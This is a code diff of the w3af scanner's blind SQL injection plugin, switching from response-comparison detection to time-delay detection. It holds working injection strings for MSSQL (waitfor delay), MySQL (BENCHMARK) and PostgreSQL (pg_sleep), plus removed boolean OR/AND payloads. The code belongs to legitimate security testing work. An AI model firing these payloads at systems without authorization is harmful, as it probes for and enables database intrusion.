@@ -1,7 +1,7 @@
 '''
-blindSqli.py
+blind_sqli_time_delay.py
 
-Copyright 2006 Andres Riancho
+Copyright 2008 Andres Riancho
 
 This file is part of w3af, w3af.sourceforge.net .
 
@@ -28,18 +28,18 @@ import core.data.kb.vuln as vuln
 import core.data.kb.knowledgeBase as kb
 import core.data.constants.severity as severity
 
+import core.data.constants.dbms as dbms
+
 from core.controllers.threads.threadManager import threadManager as tm
 from core.controllers.w3afException import w3afException
-
-import re
 
 # importing this to have sendMutant and setUrlOpener
 from core.controllers.basePlugin.basePlugin import basePlugin
 
 class blind_sqli_time_delay(basePlugin):
     '''
-    This class tests for blind SQL injection bugs, the logic is here and not as an audit plugin cause 
-    this logic is also used in attack plugins.
+    This class tests for blind SQL injection bugs using time delays, 
+    the logic is here and not as an audit plugin because this logic is also used in attack plugins.
     
     @author: Andres Riancho ( andres.riancho@gmail.com )
     '''
@@ -48,230 +48,106 @@ class blind_sqli_time_delay(basePlugin):
         # ""I'm a plugin""
         basePlugin.__init__(self)
         
-        # User configured variables
-        self._equalLimit = 0.8
-        self._equAlgorithm = 'setIntersection'
-        self._tm = tm()
+        # The wait time of the first test I'm going to perform
+        self._wait_time = 5
         
-    def setEqualLimit( self, _equalLimit ):
-        '''
-        Most of the equal algorithms use a rate to tell if two responses 
-        are equal or not. 1 is 100% equal, 0 is totally different.
+        # The original delay between request and response
+        _original_wait_time = 0
         
-        @parameter _equalLimit: The equal limit to use.
+    def is_injectable( self, freq, parameter ):
         '''
-        self._equalLimit = _equalLimit
+        Check if "parameter" of the fuzzable request object is injectable or not.
         
-    def setEquAlgorithm( self, _equAlgorithm ):
+        @freq: The fuzzableRequest object that I have to modify
+        @parameter: A string with the parameter name to test
+        @return: A vulnerability object or None if nothing is found
         '''
-        @parameter _equAlgorithm: The equal algorithm to use.
-        '''
-        self._equAlgorithm = _equAlgorithm
+        # First save the original wait time
+        _original_wait_time = self._sendMutant( freq, analyze=False ).getWaitTime()
         
-    def verifyBlindSQL( self, freq, parameter ):
-        '''
-        Verify the existance of an already found vuln.
-        '''
-        dummy = ['', ]
+        # Create the mutants
         parameter_to_test = [ parameter, ]
-        mutants = createMutants( freq , dummy, fuzzableParamList=parameter_to_test )
+        statement_list = self._get_statements()
+        sql_commands_only = [ i.sql_command for i in statement_list ]
+        mutants = createMutants( freq , sql_commands_only, fuzzableParamList=parameter_to_test )
         
+        # And now I assign the statement to the mutant
+        for i, mutant in enumerate(mutants):
+            mutant.statement = statement_list[i].sql_command
+            mutant.dbms = statement_list[i].dbms
+        
+        # Perform the test
         for mutant in mutants:
-            statements = self._get_statements( mutant )
-            for statement_type in statements:
-                vulns = self._findBsql( mutant, statements[statement_type], statement_type )
-                if len( vulns ):
-                    return vulns
-        
-        return []
-        
-    def findBlindSQL(self, fuzzableRequest, saveToKb=False ):
-        '''
-        Tests an URL for blind Sql injection vulnerabilities.
-        
-        @param freq: A fuzzableRequest
-        '''
-        dummy = ['', ]
-        mutants = createMutants( fuzzableRequest , dummy )
-        
-        for mutant in mutants:
-            statements = self._get_statements( mutant )
-            for statement_type in statements:
-                targs = (mutant, statements[ statement_type ], statement_type, saveToKb)
-                self._tm.startFunction( target=self._findBsqlAux, args=targs, ownerObj=self )
-        
-        self._tm.join( self )
-    
-    def _get_statements( self, mutant, excludeNumbers=[] ):
-        '''
-        Returns a list of statement tuples.
-        '''
-        res = {}
-        rndNum = int( createRandNum( 2 , excludeNumbers ) )
-        rndNumPlusOne = rndNum +1
-        
-        if mutant.getOriginalValue() == '':
-            # I use this when I don't have a value setted in the original request
             
-            # Unquoted, integer values
-            trueStm = '%i OR %i=%i ' % (rndNum, rndNum, rndNum )
-            falseStm = '%i AND %i=%i ' % (rndNum, rndNum, rndNumPlusOne)
-            res['numeric'] = ( trueStm, falseStm )
-            # Single quotes
-            trueStm = "%i' OR '%i'='%i" % (rndNum, rndNum, rndNum )
-            falseStm = "%i' AND '%i'='%i" % (rndNum, rndNum, rndNumPlusOne)
-            res['stringsingle'] = ( trueStm, falseStm)
-            # Double quotes
-            trueStm = '%i" OR "%i"="%i' % (rndNum, rndNum, rndNum )
-            falseStm = '%i" AND "%i"="%i' % (rndNum, rndNum, rndNumPlusOne)
-            res['stringdouble'] = ( trueStm, falseStm)
-        else:
-            # I use this when I HAVE a value setted in the original request
-            # Unquoted, integer values, they should only be used if the original value is a number
-            # if it's something like 1209jas and it's used in a WHERE... then it MUST be quoted.
-            oval = mutant.getOriginalValue()
-            if oval.isdigit():
-                trueStm = oval + ' OR %i=%i ' % (rndNum, rndNum )
-                falseStm = oval + ' AND %i=%i ' % (rndNum, rndNumPlusOne)
-                res['numeric'] = ( trueStm, falseStm )
+            # Send
+            response = self._sendMutant( mutant, analyze=False )
             
-            # Single quotes
-            trueStm = oval + "' OR '%i'='%i" % (rndNum, rndNum )
-            falseStm = oval + "' AND '%i'='%i" % (rndNum, rndNumPlusOne)
-            res['stringsingle'] = ( trueStm, falseStm)
-            # Double quotes
-            trueStm = oval + '" OR "%i"="%i' % ( rndNum, rndNum )
-            falseStm = oval + '" AND "%i"="%i' % ( rndNum, rndNumPlusOne)
-            res['stringdouble'] = ( trueStm, falseStm)
-            
-        return res
-    
-    def _findBsqlAux( self, mutant, statementTuple, statement_type, saveToKb ):
-        '''
-        Auxiliar function that does almost nothing.
-        '''
-        bsqlVulns = self._findBsql( mutant, statementTuple, statement_type )
-        if saveToKb:
-            for bsqlVuln in bsqlVulns:
-                om.out.vulnerability( bsqlVuln.getDesc() )
-                kb.kb.append( self, 'blindSqli', bsqlVuln )
+            # Compare times
+            if response.getWaitTime() > (_original_wait_time + self._wait_time-2):
                 
-    def _findBsql( self, mutant, statementTuple, statement_type ):
+                # Resend the same request to verify that this wasn't because of network delay
+                # or some other rare thing
+                _original_wait_time = self._sendMutant( freq, analyze=False ).getWaitTime()
+                response = self._sendMutant( mutant, analyze=False )
+                
+                # Compare times (once again)
+                if response.getWaitTime() > (_original_wait_time + self._wait_time-2):
+                    
+                    # Now I can be sure that I found a vuln, I control the time of the response.
+                    v = vuln.vuln( mutant )
+                    v.setName( 'Blind SQL injection - ' + mutant.dbms )
+                    v.setSeverity(severity.HIGH)
+                    v.setDesc( 'Blind SQL injection was found at: ' + mutant.foundAt() )
+                    v.setDc( mutant.getDc() )
+                    v.setId( response.id )
+                    v.setURI( response.getURI() )
+                    return v
+                
+        return None
+    
+    def _get_statements( self ):
         '''
-        Is the main algorithm for finding blind sql injections.
+        @return: A list of statements that are going to be used to test for
+        blind SQL injections. The statements are objects.
         '''
         res = []
         
-        trueStatement = statementTuple[0]
-        falseStatement = statementTuple[1]
+        # MSSQL
+        res.append( statement("1;waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
+        res.append( statement("1);waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
+        res.append( statement("1));waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
+        res.append( statement("1';waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
+        res.append( statement("1');waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
+        res.append( statement("1'));waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
         
-        mutant.setModValue( trueStatement )
-        trueResponse = self._sendMutant( mutant, analyze=False )
-
-        mutant.setModValue( falseStatement )
-        falseResponse = self._sendMutant( mutant, analyze=False )
+        # MySQL
+        # =====
+        # MySQL doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
+        # but the benchmarking will delay the response a different amount of time in each computer
+        # which sucks because I use the time delay to check!
+        #
+        # In my test environment 3500000 delays 10 seconds
+        # This is why I selected 2500000 which is guaranteeded to (at least) delay 8
+        # seconds; and I only check the delay like this:
+        #                 response.getWaitTime() > (_original_wait_time + self._wait_time-2):
+        #
+        # With a small wait time of 5 seconds, this should work without problems...
+        # and without hitting the xUrllib timeout !
+        res.append( statement("1 or BENCHMARK(2500000,MD5(1))", dbms.MYSQL) )
+        res.append( statement("1' or BENCHMARK(2500000,MD5(1)) or '1'='1", dbms.MYSQL) )
+        res.append( statement('1" or BENCHMARK(2500000,MD5(1)) or "1"="1', dbms.MYSQL) )
         
-        om.out.debug('Comparing trueResponse and falseResponse.')
-        if not self.equal( trueResponse.getBody() , falseResponse.getBody() ):
-            
-            sintaxError = "d'z'0"
-            mutant.setModValue( sintaxError )
-            seResponse = self._sendMutant( mutant, analyze=False )
-            
-            om.out.debug('Comparing trueResponse and sintaxErrorResponse.')
-            if not self.equal( trueResponse.getBody() , seResponse.getBody() ):
-                
-                # Verify the injection!
-                statements = self._get_statements( mutant )
-                secondTrueStm = statements[ statement_type ][0]
-                secondFalseStm = statements[ statement_type ][1]
-                
-                mutant.setModValue( secondTrueStm )
-                secondTrueResponse = self._sendMutant( mutant, analyze=False )
-
-                mutant.setModValue( secondFalseStm )
-                secondFalseResponse = self._sendMutant( mutant, analyze=False ) 
-                
-                om.out.debug('Comparing secondTrueResponse and trueResponse.')
-                if self.equal( secondTrueResponse.getBody(), trueResponse.getBody() ):
-                    
-                    om.out.debug('Comparing secondFalseResponse and falseResponse.')
-                    if self.equal( secondFalseResponse.getBody(), falseResponse.getBody() ):
-                        v = vuln.vuln( mutant )
-                        v.setId( secondFalseResponse.id )
-                        v.setSeverity(severity.HIGH)
-                        v.setName( 'Blind SQL injection vulnerability' )
-                        # This is needed to be used in fuzz file name
-                        v.getMutant().setOriginalValue( '' )
-                        v.getMutant().setModValue( '' )
-                        
-                        desc = 'Blind SQL injection was found at: ' + v.getURL()  + ' .'
-                        desc += ' Using method: ' + v.getMethod() + '.'
-                        desc += 'The injectable parameter is: ' + mutant.getVar()
-                        v.setDesc( desc )
-                        om.out.debug( v.getDesc() )
-                        
-                        v['type'] = statement_type
-                        v['trueHtml'] = secondTrueResponse.getBody()
-                        v['falseHtml'] = secondFalseResponse.getBody()
-                        v['errorHtml'] = seResponse.getBody()
-                        res.append( v )
-                        
+        # PostgreSQL
+        res.append( statement("1 or pg_sleep("+ str(self._wait_time) +")", dbms.POSTGRE) )
+        res.append( statement("1' or pg_sleep("+ str(self._wait_time) +") or '1'='1", dbms.POSTGRE) )
+        res.append( statement('1" or pg_sleep('+ str(self._wait_time) +') or "1"="1', dbms.POSTGRE) )
+        
+        # TODO: Add Oracle support
+        # TODO: Add XXXXX support
+        
         return res
         
-    def equal( self, body1, body2 ):
-        '''
-        Determines if two pages are equal using some tricks.
-        '''
-        if self._equAlgorithm == 'setIntersection':
-            return self._setIntersection( body1, body2)
-        elif self._equAlgorithm == 'stringEq':
-            return self._stringEq( body1, body2)
-        elif self._equAlgorithm == 'intelligentCut':
-            return self._intelligentCut( body1, body2)
-            
-        raise w3afException('Unknown algorithm selected.')
-    
-    def _intelligentCut( self, body1, body2 ):
-        '''
-        This is one of the equal algorithms. The idea is to remove the sections of the html that change from one call to another.
-        '''
-        raise w3afException('_intelligentCut is not implemented yet.')
-        
-    def _stringEq( self, body1 , body2 ):
-        '''
-        This is one of the equal algorithms.
-        '''
-        if body1 == body2:
-            om.out.debug('Pages are equal.')
-            return True
-        else:
-            om.out.debug('Pages are NOT equal.')
-            return False
-        
-    def _setIntersection( self, body1, body2 ):
-        '''
-        This is one of the equal algorithms.
-        '''
-        sb1 = re.findall('(\w+)', body1)
-        sb2 = re.findall('(\w+)', body2)
-        
-        setb1 = set( sb1 )
-        setb2 = set( sb2 )
-        
-        intersection = setb1.intersection( setb2 )
-        
-        totalLen = float( len( setb1 ) + len( setb2 ) )
-        if totalLen == 0:
-            om.out.error( 'The length of both pages are zero. Cant work with this.' )
-            return False
-        equal = ( 2 * len(intersection) ) / totalLen 
-        
-        if equal > self._equalLimit:
-            om.out.debug('Pages are equal, match rate: ' + str(equal) )
-            return True
-        else:
-            om.out.debug('Pages are NOT equal, match rate: ' + str(equal) )
-            return False
-    
-
+class statement(object):
+    def __init__(self, sql_command, dbms):
+        self.sql_command = sql_command
+        self.dbms = dbms
